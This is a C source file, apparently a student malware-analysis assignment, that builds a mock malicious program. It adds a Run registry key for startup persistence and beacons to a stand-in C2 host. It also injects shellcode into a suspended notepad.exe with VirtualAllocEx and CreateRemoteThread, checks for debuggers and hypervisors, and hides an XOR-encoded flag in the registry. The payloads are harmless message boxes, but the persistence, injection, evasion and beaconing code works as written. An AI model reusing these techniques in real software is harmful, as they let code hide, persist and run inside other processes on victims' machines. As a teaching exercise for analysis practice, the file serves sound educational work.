#include <WinSock2.h>
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdio.h>
#include <winternl.h> // Never Used Import...
#include <direct.h>

int main(int argc, char *argv[]){
    
    //Error Checking for # of arguments
    if(argc > 2){
        printf("Too Many Arguments");
        return 1;
    }

    //Will never run because final.exe is the first argument in argv and that means argc = 1
    if(argc < 0){
        /*
        Creates a Calculator Process and Displays it
        Used to Make it more difficult to be understood because 
        This process is never used.
        */
        STARTUPINFO startup;
        PROCESS_INFORMATION process;

        ZeroMemory(&startup, sizeof(startup));
        ZeroMemory(&process, sizeof(process));

        CreateProcess(NULL, "C:\\Windows\\System32\\calc.exe", NULL, NULL, FALSE, 0, NULL, NULL, &startup, &process);
        
    }

    if(argc == 2 && strcmp(argv[1], "-d") == 0){
        /*
        Checks to see if a debugger is present using an API Call
        If One is, a Message Box pops Up
        */
        if (IsDebuggerPresent()){
            MessageBox(NULL, "DEBUGGER PRESENT", "Popup Message", MB_OK);
        }
    } else if (argc == 2 && strcmp(argv[1], "-h") == 0){
        /*
        Checks to see if it is being run inside a Hypervisor
        Creates a Message box if it is
        */

        uint32_t eax, ebx, ecx, edx; //variables for each 32-bit register

        eax = 0x1; //Flag to get the details about the processor and its environment
        
        /*
        Inline assembly code to retrieve the values of each register and store it in
        the variables above. ASM means inline assembly. Volatile means it may cause errors
        or be incorrect. Lets the compiler know not to touch it.

        cupid instruction to query the processor for information about its environment.
        The following Line means take the value in ebx and store it in our variable named ebx above
        The following Line means that eax is our input to cpuid.

        Even though VS code says that there is an error on these lines, there is not when using gcc
        */

        asm volatile(
            "cpuid"
            : "=b" (ebx), "=c" (ecx), "=d" (edx)
            : "a" (eax)
        );
        
        //If the 31st bit is present in cpuid, Hypervisor is Present
        if (ecx & (1 << 31)){
            MessageBox(NULL, "HYPERVISOR PRESENT", "Popup Message", MB_OK);
            
        }
    } else if(argc == 2 && strcmp("-p", argv[1]) == 0){

        HKEY myHandle;
        
        //The Path to the Register Key that we wish to edit
        const char* reg = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
        //The name of the new entry
        const char* name = "MyBadFile";
        //In the run file, the data entry is the path to the file we want to run on startup
       
        char path[2048];

        _getcwd(path, sizeof(path));

        strcat(path, "\\final.exe");

        //Open Key with handle myHandle
        RegOpenKeyEx(HKEY_CURRENT_USER, reg, 0, KEY_SET_VALUE, &myHandle);

        /*
        Using the Handle Created Above, Add an entry
        using reg, name and path as well as REG_SZ for default type (string)
        */
        RegSetValueEx(myHandle, name, 0, REG_SZ, (const BYTE*) path, (DWORD)(strlen(path) + 1));

        //Close Handle to Key
        RegCloseKey(myHandle);

    } else if (argc == 2 && strcmp("-c", argv[1]) == 0){
        WSADATA data; //Data structure for creating a socket using the WSA API
        SOCKET mySock; //A variable to access the created socket
        
        struct sockaddr_in server; //A data structure for defining a IPv4 IP Address

        //The GET request we are sending to the server (server variable) through the socket mySock
        const char *request = "GET /A_R0GU3_FL@G_SEAN_4484 HTTP/1.1\r\nHost: C2.Sean.com\r\n\r\n";

        WSAStartup(MAKEWORD(2, 2), &data); //Create socket using WSA API

        server.sin_family = AF_INET; //Type of connection
        server.sin_port = htons(80); //Port number
        server.sin_addr.s_addr = inet_addr("192.168.192.168"); //IP address

        mySock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); //Create Socket on Port 80 (HTTP)

        connect(mySock, (struct sockaddr *) &server, sizeof(server)); //Connect through the socket to IP
        
        send(mySock, request, strlen(request), 0); //Send Payload (request) i.e Get Request

        closesocket(mySock); //Close the socket
        WSACleanup(); //Close the WSA API
    } else if(argc == 2 && strcmp(argv[1], "-r") == 0){
    
        //NOT MY SHELLCODE. Taken From: https://gist.github.com/kkent030315/b508e56a5cb0e3577908484fa4978f12
        char data[] =   "\x48\x83\xEC\x28\x48\x83\xE4\xF0\x48\x8D\x15\x66\x00\x00\x00"
                        "\x48\x8D\x0D\x52\x00\x00\x00\xE8\x9E\x00\x00\x00\x4C\x8B\xF8"
                        "\x48\x8D\x0D\x5D\x00\x00\x00\xFF\xD0\x48\x8D\x15\x5F\x00\x00"
                        "\x00\x48\x8D\x0D\x4D\x00\x00\x00\xE8\x7F\x00\x00\x00\x4D\x33"
                        "\xC9\x4C\x8D\x05\x61\x00\x00\x00\x48\x8D\x15\x4E\x00\x00\x00"
                        "\x48\x33\xC9\xFF\xD0\x48\x8D\x15\x56\x00\x00\x00\x48\x8D\x0D"
                        "\x0A\x00\x00\x00\xE8\x56\x00\x00\x00\x48\x33\xC9\xFF\xD0\x4B"
                        "\x45\x52\x4E\x45\x4C\x33\x32\x2E\x44\x4C\x4C\x00\x4C\x6F\x61"
                        "\x64\x4C\x69\x62\x72\x61\x72\x79\x41\x00\x55\x53\x45\x52\x33"
                        "\x32\x2E\x44\x4C\x4C\x00\x4D\x65\x73\x73\x61\x67\x65\x42\x6F"
                        "\x78\x41\x00\x48\x65\x6C\x6C\x6F\x20\x77\x6F\x72\x6C\x64\x00"
                        "\x4D\x65\x73\x73\x61\x67\x65\x00\x45\x78\x69\x74\x50\x72\x6F"
                        "\x63\x65\x73\x73\x00\x48\x83\xEC\x28\x65\x4C\x8B\x04\x25\x60"
                        "\x00\x00\x00\x4D\x8B\x40\x18\x4D\x8D\x60\x10\x4D\x8B\x04\x24"
                        "\xFC\x49\x8B\x78\x60\x48\x8B\xF1\xAC\x84\xC0\x74\x26\x8A\x27"
                        "\x80\xFC\x61\x7C\x03\x80\xEC\x20\x3A\xE0\x75\x08\x48\xFF\xC7"
                        "\x48\xFF\xC7\xEB\xE5\x4D\x8B\x00\x4D\x3B\xC4\x75\xD6\x48\x33"
                        "\xC0\xE9\xA7\x00\x00\x00\x49\x8B\x58\x30\x44\x8B\x4B\x3C\x4C"
                        "\x03\xCB\x49\x81\xC1\x88\x00\x00\x00\x45\x8B\x29\x4D\x85\xED"
                        "\x75\x08\x48\x33\xC0\xE9\x85\x00\x00\x00\x4E\x8D\x04\x2B\x45"
                        "\x8B\x71\x04\x4D\x03\xF5\x41\x8B\x48\x18\x45\x8B\x50\x20\x4C"
                        "\x03\xD3\xFF\xC9\x4D\x8D\x0C\x8A\x41\x8B\x39\x48\x03\xFB\x48"
                        "\x8B\xF2\xA6\x75\x08\x8A\x06\x84\xC0\x74\x09\xEB\xF5\xE2\xE6"
                        "\x48\x33\xC0\xEB\x4E\x45\x8B\x48\x24\x4C\x03\xCB\x66\x41\x8B"
                        "\x0C\x49\x45\x8B\x48\x1C\x4C\x03\xCB\x41\x8B\x04\x89\x49\x3B"
                        "\xC5\x7C\x2F\x49\x3B\xC6\x73\x2A\x48\x8D\x34\x18\x48\x8D\x7C"
                        "\x24\x30\x4C\x8B\xE7\xA4\x80\x3E\x2E\x75\xFA\xA4\xC7\x07\x44"
                        "\x4C\x4C\x00\x49\x8B\xCC\x41\xFF\xD7\x49\x8B\xCC\x48\x8B\xD6"
                        "\xE9\x14\xFF\xFF\xFF\x48\x03\xC3\x48\x83\xC4\x28\xC3";
                //Shell Code to create a MessageBox that says Hello World!
        
        STARTUPINFO startup; //Startup info for the process we create
        PROCESS_INFORMATION process; //Variable to store our created process

        //Zero Out the Memory in that space
        ZeroMemory(&startup, sizeof(startup));
        ZeroMemory(&process, sizeof(process));

        //Create an instance of Notepad.exe with the startup info above and store it in process
        //NOTE: the creation flag CREATE_SUSPENDED is passed so the process does not begin to execute
        CreateProcess(NULL, "C:\\Windows\\System32\\notepad.exe", NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &startup, &process);

        CONTEXT con; //Context Variable to store a current state (context) of a thread
        ZeroMemory(&con, sizeof(con)); //Zero out the memory

        con.ContextFlags = CONTEXT_FULL; //Retrieves All Register Values
        GetThreadContext(process.hThread, &con); //Gets the context of the process we created and stores it
        
        //Virtually Allocates Space in the process for the shellcode above and saves the address of that entry point
        LPVOID baseAddr = VirtualAllocEx(process.hProcess, NULL, sizeof(data), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

        //Writes the shell code above starting at the entry point above
        WriteProcessMemory(process.hProcess, baseAddr, data, sizeof(data), 0);

        //Creates a Thread for the process above and runs starting at the entry point given above
        HANDLE thread = CreateRemoteThread(process.hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)baseAddr, NULL, 0, NULL);

        CloseHandle(thread);
        CloseHandle(process.hProcess);
        CloseHandle(process.hThread);
    } else if(argc == 2 && strcmp(argv[1], "-e") == 0){

        char message[] = "KBCNNODLFKMYOKD>>2>\0"; //Hidden Flag
        char key = 10; //A decryption key
        int i=0; //Counter
        int max = strlen(message); //Max for counter

        while(i<max){ //Obfuscated Loop [ for(int i=0; i<strlen(message); i++){} ]
            message[i] = message[i] ^ key; //XOR decryption of the message above
            i++; //increments counter
        }

        const char* reg = "SOFTWARE\\A_BAD_PROGRAM"; //Register Key that we wish to save our hidden flag in
        HKEY myKey; //Handle for A registry Key
        //Create a New Registry Key with the handle above
        //REG_OPTION_NON_VOLITALE is passed so that it can persist over system reboots
        RegCreateKeyEx(HKEY_CURRENT_USER, reg, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &myKey, NULL);

        //Set a value in the registry with our hidden flag
        RegSetValueEx(myKey, "A Safe Entry...", 0, REG_SZ, (BYTE*)message, strlen(message) + 1);

        //Close Handle
        RegCloseKey(myKey);
    } else if (FALSE) { // A branch that will never run even though it has been coded
        MessageBox(NULL, "This is a Message Box That will Never Be Displayed", "Popup Message", MB_OK);
        
        
        
        return 0;
    }

    //Message box to popup as per assignment instructions
    MessageBox(NULL, "For Educational Purposes. This is Not Malware", "Popup Message", MB_OK);

    return 0;
}